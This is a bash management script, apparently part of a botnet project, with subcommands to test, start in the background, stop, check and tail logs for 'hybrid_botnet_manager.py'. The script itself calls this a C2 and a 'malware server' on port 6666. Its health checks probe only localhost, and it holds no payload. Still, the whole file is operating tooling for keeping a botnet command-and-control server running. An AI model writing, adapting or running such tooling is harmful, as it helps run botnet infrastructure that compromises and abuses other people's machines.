#!/usr/bin/env bash
set -euo pipefail

PROJECT_ROOT="$(cd "$(dirname "$0")" && pwd)"
cd "$PROJECT_ROOT"

LOG_DIR="$PROJECT_ROOT/logs"
mkdir -p "$LOG_DIR"
MANAGER_LOG="$LOG_DIR/manager.log"

usage() {
  cat <<EOF
Usage: $0 [test|start|stop|status|logs]
  test    Run tests and verify malware server (port 6666)
  start   Start hybrid manager in background (nohup) and verify
  stop    Stop running hybrid manager process
  status  Show listening ports and process status
  logs    Tail manager logs
EOF
}

is_listening() {
  local port="$1"
  if netstat -tlnp 2>/dev/null | grep -q ":${port} "; then
    return 0
  fi
  return 1
}

wait_for_port() {
  local host="$1"; local port="$2"; local timeout="${3:-8}"
  local start_ts="$(date +%s)"
  while true; do
    if (echo > /dev/tcp/$host/$port) >/dev/null 2>&1; then return 0; fi
    sleep 0.2
    local now="$(date +%s)"
    if (( now - start_ts > timeout )); then return 1; fi
  done
}

cmd_test() {
  echo "🚀 C2 RUNNER - TESTS + MALWARE SERVER CHECK"
  echo "=================================================="
  if [ -f tests/run_all_tests.py ]; then
    echo "🧪 Running test suite..."
    python3 tests/run_all_tests.py || { echo "❌ Tests failed"; exit 1; }
  else
    echo "⚠️  Test runner not found, skipping tests"
  fi
  echo "\n🔌 Verifying malware server (port 6666)..."
  ( cd bane && timeout 15s python3 hybrid_botnet_manager.py >/tmp/c2_manager.out 2>&1 || true )
  if is_listening 6666 || curl -sS http://127.0.0.1:6666/status >/dev/null 2>&1; then
    echo "✅ Malware server OK on port 6666"
  else
    echo "❌ Malware server not reachable on port 6666"
    tail -n 80 /tmp/c2_manager.out || true
    exit 1
  fi
  echo "\n🎉 All checks passed. System is healthy."
}

cmd_start() {
  echo "🚀 Starting Hybrid Manager (background)..."
  if pgrep -f "hybrid_botnet_manager.py" >/dev/null; then
    echo "⚠️  Already running"; exit 0
  fi
  nohup bash -c "cd bane && python3 hybrid_botnet_manager.py" >"$MANAGER_LOG" 2>&1 &
  sleep 1
  echo "⏳ Waiting for malware server on 6666..."
  if wait_for_port 127.0.0.1 6666 12; then
    echo "✅ Malware server is up (6666)"
  else
    echo "❌ Malware server failed to start - check logs: $MANAGER_LOG"
    tail -n 100 "$MANAGER_LOG" || true
    exit 1
  fi
  echo "📄 Logs: $MANAGER_LOG"
}

cmd_stop() {
  echo "🛑 Stopping Hybrid Manager..."
  pkill -f "hybrid_botnet_manager.py" >/dev/null 2>&1 || true
  sleep 1
  if pgrep -f "hybrid_botnet_manager.py" >/dev/null; then
    echo "❌ Could not stop. Try: kill -9 $(pgrep -f hybrid_botnet_manager.py | tr '\n' ' ')"
    exit 1
  fi
  echo "✅ Stopped"
}

cmd_status() {
  echo "🔍 Process status:"
  pgrep -af "hybrid_botnet_manager.py" || echo "(no process)"
  echo "\n🔌 Listening ports (python):"
  netstat -tlnp 2>/dev/null | grep python || echo "(none)"
}

cmd_logs() {
  echo "📄 Tailing logs: $MANAGER_LOG"
  tail -n 100 -f "$MANAGER_LOG"
}

case "${1:-test}" in
  test) cmd_test ;;
  start) cmd_start ;;
  stop) cmd_stop ;;
  status) cmd_status ;;
  logs) cmd_logs ;;
  *) usage; exit 1 ;;
 esac
